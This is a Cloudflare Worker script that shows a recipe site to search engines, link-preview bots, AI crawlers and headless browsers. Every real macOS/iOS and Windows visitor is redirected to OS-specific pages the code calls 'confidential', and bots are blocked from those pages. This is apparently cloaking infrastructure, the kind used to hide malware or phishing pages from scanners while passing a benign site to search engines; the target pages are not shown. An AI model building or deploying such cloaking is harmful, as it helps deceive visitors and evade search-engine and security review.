/**
 * Cloudflare Worker — OS-based User-Agent redirect with bot bypass
 * 
 * LOGIC (runs on EVERY request):
 *   1. Is visitor a bot/crawler? → Let them through to see recipe content (SEO)
 *   2. Is visitor already on apple.html or windows.html? → Let them through (no loop)
 *   3. Is visitor on macOS/iOS? → Redirect to /apple.html
 *   4. Is visitor on Windows? → Redirect to /Windows/windows.html
 *   5. Everything else (Linux, Android) → Let them see the recipe site
 * 
 * This ensures:
 *   - Google/Bing always see recipe content on every page
 *   - Windows users ALWAYS land on windows.html, no matter which URL they click
 *   - Apple users ALWAYS land on apple.html, no matter which URL they click
 *   - Linux/Android users see the normal recipe site
 */
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const path = url.pathname.toLowerCase();
    const ua = (request.headers.get("User-Agent") || "").toLowerCase();

    // ─── STEP 1: ALREADY ON CONFIDENTIAL PAGES → LET THROUGH ───
    // If the user is already on apple.html or windows.html, don't redirect
    // again (this prevents infinite redirect loops).
    if (path === "/apple.html" || path.startsWith("/windows/")) {
      // But first: block bots from these pages
      const botKeywords = ["bot", "crawler", "spider", "googlebot", "bingbot",
        "slurp", "duckduckbot", "baiduspider", "yandexbot", "facebot",
        "facebookexternalhit", "twitterbot", "linkedinbot", "applebot",
        "semrushbot", "ahrefsbot", "gptbot", "claudebot", "bytespider",
        "petalbot", "headlesschrome", "phantomjs", "google-inspectiontool"];
      const isBotOnConfidential = botKeywords.some((kw) => ua.includes(kw));
      if (isBotOnConfidential) {
        // Bot trying to access confidential page → send to homepage
        url.pathname = "/";
        return Response.redirect(url.toString(), 302);
      }
      // Real user already on their correct page → let through
      return fetch(request);
    }

    // ─── STEP 2: SKIP NON-HTML RESOURCES ────────────────────────
    // Don't redirect requests for CSS, JS, images, fonts, sitemap, robots, etc.
    // Only redirect actual page visits (HTML pages and root path).
    const staticExtensions = [".css", ".js", ".png", ".jpg", ".jpeg", ".gif",
      ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".xml", ".txt",
      ".json", ".map", ".webp", ".avif", ".mp4", ".webm", ".pdf"];
    if (staticExtensions.some((ext) => path.endsWith(ext))) {
      return fetch(request);
    }

    // ─── STEP 3: BOT / CRAWLER DETECTION ────────────────────────
    // If the visitor is a bot, let them through to see recipe content.
    const botPatterns = [
      "googlebot",        // Google Search
      "bingbot",          // Bing Search
      "slurp",            // Yahoo
      "duckduckbot",      // DuckDuckGo
      "baiduspider",      // Baidu
      "yandexbot",        // Yandex
      "sogou",            // Sogou
      "exabot",           // Exalead
      "facebot",          // Facebook
      "facebookexternalhit", // Facebook link preview
      "ia_archiver",      // Alexa/Internet Archive
      "twitterbot",       // Twitter link preview
      "linkedinbot",      // LinkedIn link preview
      "slackbot",         // Slack link preview
      "telegrambot",      // Telegram link preview
      "whatsapp",         // WhatsApp link preview
      "discordbot",       // Discord link preview
      "applebot",         // Apple/Siri
      "semrushbot",       // SEMrush
      "ahrefsbot",        // Ahrefs
      "mj12bot",          // Majestic
      "dotbot",           // Moz
      "petalbot",         // Huawei/Petal
      "bytespider",       // ByteDance/TikTok
      "gptbot",           // OpenAI
      "claudebot",        // Anthropic
      "chatgpt-user",     // ChatGPT browsing
      "google-inspectiontool", // Google Search Console
      "chrome-lighthouse", // Google Lighthouse
      "pagespeed",        // Google PageSpeed
      "headlesschrome",   // Headless Chrome
      "phantomjs",        // PhantomJS
      "crawler",          // Generic crawler
      "spider",           // Generic spider
      "bot",              // Generic bot (catches most)
    ];

    const isBot = botPatterns.some((pattern) => ua.includes(pattern));

    if (isBot) {
      // Bot → let them see the recipe page they requested
      return fetch(request);
    }

    // ─── STEP 4: REAL USER OS DETECTION → REDIRECT ──────────────

    // macOS, iPhone, iPad, iPod → apple.html
    if (
      ua.includes("macintosh") ||
      ua.includes("mac os") ||
      ua.includes("iphone") ||
      ua.includes("ipad") ||
      ua.includes("ipod")
    ) {
      url.pathname = "/apple.html";
      return Response.redirect(url.toString(), 302);
    }

    // Windows → windows.html
    if (ua.includes("windows")) {
      url.pathname = "/Windows/windows.html";
      return Response.redirect(url.toString(), 302);
    }

    // ─── STEP 5: FALLBACK ───────────────────────────────────────
    // Linux, Android, other OS → let them see the recipe site normally
    return fetch(request);
  },
};
